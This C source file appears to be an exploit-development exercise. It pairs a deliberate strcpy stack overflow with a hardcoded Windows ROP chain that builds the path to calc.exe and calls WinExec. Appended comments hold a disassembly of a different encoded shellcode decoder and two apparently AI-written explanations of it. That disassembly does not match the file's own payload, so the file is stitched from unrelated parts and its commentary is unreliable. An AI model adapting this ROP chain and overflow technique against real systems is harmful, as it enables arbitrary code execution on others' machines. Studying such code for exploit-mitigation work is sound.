#include <string.h>
#include <stdio.h>

void vulnerable_function(char *str)
{
	char	buffer[15];
	strcpy(buffer, str);

}

void	shellcode()
{

	unsigned char code[] = 
"\xb1\x4f\x97\x7c"  // POP ECX # RETN
"\xf9\x10\x47\x7e"  // Writable PTR USER32.dll
"\x27\xfa\x87\x7c"  // POP EDX # POP EAX # RETN
"\x43\x3a\x5c\x57"  // ASCII "C:\W"
"\x49\x4e\x44\x4f"  // ASCII "INDO"
"\x04\x18\x80\x7c"  // MOV DWORD PTR DS:[ECX],EDX # MOV DWORD PTR DS:[ECX+4],EAX # POP EBP # RETN 04
"\x8a\x20\x87\x7c"  // Compensate POP
"\x8a\x20\x87\x7c"  // Compensate RETN
"\x8a\x20\x87\x7c"  // Compensate RETN
"\xe5\x02\x88\x7c"  // POP EAX # RETN
"\x57\x53\x5c\x73"  // ASCII "WS\s"
"\x38\xd6\x46\x7e"  // MOV DWORD PTR DS:[ECX+8],EAX # POP ESI # POP EBP # RETN 08
"\x8a\x20\x87\x7c"  // Compensate POP
"\x8a\x20\x87\x7c"  // Compensate POP
"\x8a\x20\x87\x7c"  // Compensate RETN
"\x8a\x20\x87\x7c"  // Compensate RETN
"\x8a\x20\x87\x7c"  // Compensate RETN
"\xe5\x02\x88\x7c"  // POP EAX # RETN
"\x79\x73\x74\x65"  // ASCII "yste"
"\xcb\xbe\x45\x7e"  // MOV DWORD PTR DS:[ECX+C],EAX # XOR EAX,EAX # INC EAX # POP ESI # POP EBP # RETN 08
"\x8a\x20\x87\x7c"  // Compensate POP
"\x8a\x20\x87\x7c"  // Compensate POP
"\x8a\x20\x87\x7c"  // Compensate RETN
"\x8a\x20\x87\x7c"  // Compensate RETN
"\x8a\x20\x87\x7c"  // Compensate RETN
"\xe5\x02\x88\x7c"  // POP EAX # RETN
"\x63\x61\x6c\x63"  // ASCII "calc"
"\x31\xa9\x91\x7c"  // MOV DWORD PTR DS:[ECX+14],EAX # MOV EAX,EDX # POP EBP # RETN 08
"\x8a\x20\x87\x7c"  // Compensate POP
"\x8a\x20\x87\x7c"  // Compensate RETN
"\x8a\x20\x87\x7c"  // Compensate RETN
"\x8a\x20\x87\x7c"  // Compensate RETN
"\x07\x3d\x96\x7c"  // INC ECX # RETN
"\x07\x3d\x96\x7c"  // INC ECX # RETN
"\x07\x3d\x96\x7c"  // INC ECX # RETN
"\x07\x3d\x96\x7c"  // INC ECX # RETN
"\xe5\x02\x88\x7c"  // POP EAX # RETN
"\x6d\x33\x32\x5c"  // ASCII "m32\"
"\xcb\xbe\x45\x7e"  // MOV DWORD PTR DS:[ECX+C],EAX # XOR EAX,EAX # INC EAX # POP ESI # POP EBP # RETN 08
"\x8a\x20\x87\x7c"  // Compensate POP
"\x8a\x20\x87\x7c"  // Compensate POP
"\x8a\x20\x87\x7c"  // Compensate RETN
"\x8a\x20\x87\x7c"  // Compensate RETN
"\x8a\x20\x87\x7c"  // Compensate RETN
"\xe5\x02\x88\x7c"  // POP EAX # RETN
"\x2e\x65\x78\x65"  // ASCII ".exe"
"\x31\xa9\x91\x7c"  // MOV DWORD PTR DS:[ECX+14],EAX # MOV EAX,EDX # POP EBP # RETN 08
"\x8a\x20\x87\x7c"  // Compensate POP
"\x8a\x20\x87\x7c"  // Compensate RETN
"\x8a\x20\x87\x7c"  // Compensate RETN
"\x8a\x20\x87\x7c"  // Compensate RETN
"\x07\x3d\x96\x7c"  // INC ECX # RETN
"\x07\x3d\x96\x7c"  // INC ECX # RETN
"\x07\x3d\x96\x7c"  // INC ECX # RETN
"\x07\x3d\x96\x7c"  // INC ECX # RETN
"\x9e\x2e\x92\x7c"  // XOR EAX,EAX # RETN
"\x31\xa9\x91\x7c"  // MOV DWORD PTR DS:[ECX+14],EAX # MOV EAX,EDX # POP EBP # RETN 08
"\x8a\x20\x87\x7c"  // Compensate POP
"\x8a\x20\x87\x7c"  // Compensate RETN
"\x8a\x20\x87\x7c"  // Compensate RETN
"\x8a\x20\x87\x7c"  // Compensate RETN
"\xee\x4c\x97\x7c"  // DEC ECX # RETN
"\xee\x4c\x97\x7c"  // DEC ECX # RETN
"\xee\x4c\x97\x7c"  // DEC ECX # RETN
"\xee\x4c\x97\x7c"  // DEC ECX # RETN
"\xee\x4c\x97\x7c"  // DEC ECX # RETN
"\xee\x4c\x97\x7c"  // DEC ECX # RETN
"\xee\x4c\x97\x7c"  // DEC ECX # RETN
"\xee\x4c\x97\x7c"  // DEC ECX # RETN
//-------------------------------------------["C:\WINDOWS\system32\calc.exe+00000000" -> ecx]-//
"\xe5\x02\x88\x7c"  // POP EAX # RETN
"\x7a\xeb\xc3\x6f"  // Should result in a valid PTR in kernel32.dll
"\x4f\xda\x85\x7c"  // PUSH ESP # ADC BYTE PTR DS:[EAX+CC4837C],AL # XOR EAX,EAX # INC EAX # POP EDI # POP EBP # RETN 08
"\x8a\x20\x87\x7c"  // Compensate POP
"\x8a\x20\x87\x7c"  // Compensate RETN
"\x8a\x20\x87\x7c"  // Compensate RETN
"\x8a\x20\x87\x7c"  // Compensate RETN
"\x32\xd9\x44\x7e"  // XCHG EAX,EDI # RETN
"\x62\x28\x97\x7c"  // ADD EAX,20 # POP EBP # RETN
"\x8a\x20\x87\x7c"  // Compensate POP
"\x62\x28\x97\x7c"  // ADD EAX,20 # POP EBP # RETN
"\x8a\x20\x87\x7c"  // Compensate POP
"\x62\x28\x97\x7c"  // ADD EAX,20 # POP EBP # RETN
"\x8a\x20\x87\x7c"  // Compensate POP
"\x62\x28\x97\x7c"  // ADD EAX,20 # POP EBP # RETN
"\x8a\x20\x87\x7c"  // Compensate POP
//-----------------------------------------------------------[Save Stack Pointer + pivot eax]-//
"\xd6\xd1\x95\x7c"  // MOV DWORD PTR DS:[EAX+10],ECX # POP EBP # RETN 04
"\x8a\x20\x87\x7c"  // Compensate POP
"\x8a\x20\x87\x7c"  // Compensate RETN
"\x8a\x20\x87\x7c"  // Compensate RETN
"\x33\x80\x97\x7c"  // INC EAX # RETN
"\x33\x80\x97\x7c"  // INC EAX # RETN
"\x33\x80\x97\x7c"  // INC EAX # RETN
"\x33\x80\x97\x7c"  // INC EAX # RETN
"\xf5\xd6\x91\x7c"  // XOR ECX,ECX # RETN
"\x07\x3d\x96\x7c"  // INC ECX # RETN
"\xd6\xd1\x95\x7c"  // MOV DWORD PTR DS:[EAX+10],ECX # POP EBP # RETN 04
"\x8a\x20\x87\x7c"  // Compensate POP
"\x8a\x20\x87\x7c"  // Compensate RETN
"\x8a\x20\x87\x7c"  // Compensate RETN
"\xb1\x4f\x97\x7c"  // POP ECX # RETN
"\xed\x2a\x86\x7c"  // WinExec()
"\xe7\xc1\x87\x7c"  // MOV DWORD PTR DS:[EAX+4],ECX # XOR EAX,EAX # POP EBP # RETN 04
"\x8a\x20\x87\x7c"  // Compensate POP
"\x8a\x20\x87\x7c"  // Compensate RETN
"\x8a\x20\x87\x7c"  // Compensate RETN
"\x8a\x20\x87\x7c"  // Final RETN for WinExec()
"\x8a\x20\x87\x7c"; // Compensate WinExec()
//------------------------------------------------------[Write Arguments and execute -> calc]-//
	((void (*)())code)();

}

int main(int argc, char **argv)
{
	(void) argc;
	(void) argv;
	printf("%p", &shellcode);
	vulnerable_function("09874500064888675436\x80\x10\x40\x00");

	return (0);
}

/* Disassembly hexcode (https://defuse.ca/online-x86-assembler.htm#disassembly2)
0:  db c0                   fcmovnb st,st(0)
2:  31 c9                   xor    ecx,ecx
4:  bf 7c 16 70 cc          mov    edi,0xcc70167c
9:  d9 74 24 f4             fnstenv [esp-0xc]
d:  b1 1e                   mov    cl,0x1e
f:  58                      pop    eax
10: 31 78 18                xor    DWORD PTR [eax+0x18],edi
13: 83 e8 fc                sub    eax,0xfffffffc
16: 03 78 68                add    edi,DWORD PTR [eax+0x68]
19: f4                      hlt
1a: 85 30                   test   DWORD PTR [eax],esi
1c: 78 bc                   js     0xffffffda
1e: 65 c9                   gs leave
20: 78 b6                   js     0xffffffd8
22: 23 f5                   and    esi,ebp
24: f3 b4 ae                repz mov ah,0xae
27: 7d 02                   jge    0x2b
29: aa                      stos   BYTE PTR es:[edi],al
2a: 3a 32                   cmp    dh,BYTE PTR [edx]
2c: 1c bf                   sbb    al,0xbf
2e: 62                      (bad)
2f: ed                      in     eax,dx
30: 1d 54 d5 66 29          sbb    eax,0x2966d554
35: 21 e7                   and    edi,esp
37: 96                      xchg   esi,eax
38: 60                      pusha
39: f5                      cmc
3a: 71 ca                   jno    0x6
3c: 06                      push   es
3d: 35 f5 14 c7 7c          xor    eax,0x7cc714f5
42: fb                      sti
43: 1b 05 6b f0 27 dd       sbb    eax,DWORD PTR ds:0xdd27f06b
49: 48                      dec    eax
4a: fd                      std
4b: 22 38                   and    bh,BYTE PTR [eax]
4d: 1b a2 e8 c3 f7 3b       sbb    esp,DWORD PTR [edx+0x3bf7c3e8]
53: 7a cf                   jp     0x24
55: 4c                      dec    esp
56: 4f                      dec    edi
57: 23 d3                   and    edx,ebx
59: 53                      push   ebx
5a: a4                      movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
5b: 57                      push   edi
5c: f7 d8                   neg    eax
5e: 3b 83 8e 83 1f 57       cmp    eax,DWORD PTR [ebx+0x571f838e]
64: 53                      push   ebx
65: 64 51                   fs push ecx
67: a1 33 cd f5 c6          mov    eax,ds:0xc6f5cd33
6c: f5                      cmc
6d: c1 7e 98 f5             sar    DWORD PTR [esi-0x68],0xf5
71: aa                      stos   BYTE PTR es:[edi],al
72: f1                      icebp
73: 05 a8 26 99 3d          add    eax,0x3d9926a8
78: 3b c0                   cmp    eax,eax
7a: d9 fe                   fsin
7c: 51                      push   ecx
7d: 61                      popa
7e: b6 0e                   mov    dh,0xe
80: 2f                      das
81: 85 19                   test   DWORD PTR [ecx],ebx
83: 87 b7 78 2f 59 90       xchg   DWORD PTR [edi-0x6fa6d088],esi
89: 7b d7                   jnp    0x62
8b: 05 7f e8 7b ca          add    eax,0xca7be87f 
*/

/*
To understand this, it's important to know that assembly language is a low-level programming language for a computer, or other programmable device, in which there is a very strong correspondence between the language and the architecture's machine code instructions. Here is a simplified explanation of a few of the instructions mentioned in the code:

    fcmovnb st,st(0): This command does a floating-point comparison and move if not below. Essentially, it is trying to perform an operation on the top of the floating-point stack (which in this case does nothing).

    xor ecx,ecx: This command is using the XOR operation (exclusive or) to set the value of ecx to 0. If you XOR anything with itself, the result is zero.

    mov edi,0xcc70167c: This command moves the hexadecimal value 0xcc70167c into the edi register. The mov command is used to transfer data from one location to another.

    fnstenv [esp-0xc]: This command saves the current state of the floating-point unit to the memory location indicated (esp-0xc in this case).

    pop eax: This command removes (pops) the top value from the stack and puts it into the eax register.

    xor DWORD PTR [eax+0x18],edi: This command XORs the value at the memory location eax+0x18 with the value in edi, and stores the result at the memory location eax+0x18.

    sub eax,0xfffffffc: This command subtracts 0xfffffffc from eax and stores the result in eax.

    add edi,DWORD PTR [eax+0x68]: This command adds the value at the memory location eax+0x68 to the value in edi, and stores the result in edi.

    hlt: This command halts the CPU. This means that it stops all CPU functions except for functions that respond to an interrupt.

The remaining commands perform similar operations (moving data, adding, subtracting, performing bitwise operations, etc.), often based on certain conditions.

Remember that even though we can explain what individual instructions do, understanding the overall intent of a piece of assembly code, especially one as complex and potentially obfuscated as this, can be quite challenging. The same piece of assembly code can do very different things depending on the context in which it is used.

----

The provided assembly code appears to be shellcode, often used in exploit development for tasks like spawning a shell, creating a reverse connection, or executing specific system commands. However, without contextual information, it's tough to determine its exact purpose.

For educational purposes, here's a rough explanation of some of the instructions:

    fcmovnb st,st(0): Floating-point conditional move if not below. This doesn't really make sense in this context, as it moves st(0) to st(0), essentially a no-op. This could be used for obfuscation or might be a disassembly error.
    xor ecx,ecx: XORs the ecx register with itself, setting it to zero.
    mov edi,0xcc70167c: Moves the hexadecimal value 0xcc70167c into the edi register.
    fnstenv [esp-0xc]: Stores the current x87 FPU environment to the memory at esp-0xc. This can be used for instruction pointer discovery in shellcode.
    pop eax: Removes the top value from the stack and places it in eax.
    xor DWORD PTR [eax+0x18],edi: XORs the DWORD value at the address eax+0x18 with edi.
    sub eax,0xfffffffc: Subtracts 0xfffffffc (or adds 4, due to two's complement) from eax.
    add edi,DWORD PTR [eax+0x68]: Adds the DWORD value at address eax+0x68 to edi.
    hlt: Halts the CPU until the next external interrupt is fired. In most cases, the code execution should not reach this point.

Further down, there are many jumps, bitwise operations, and comparisons which could be part of a conditional execution logic, buffer operation, or decoding routine.

Again, without contextual information, it's very difficult to provide a clear explanation of what this code does exactly. It might not even perform a sensible operation when executed, given it appears to have some disassembly errors and odd instructions.

For better understanding, it would be beneficial to run it in a controlled environment such as a virtual machine, using a debugger to step through the code and see how it behaves dynamically. However, ensure that this is done in a safe and responsible manner to avoid potential harm to your system or data.
*/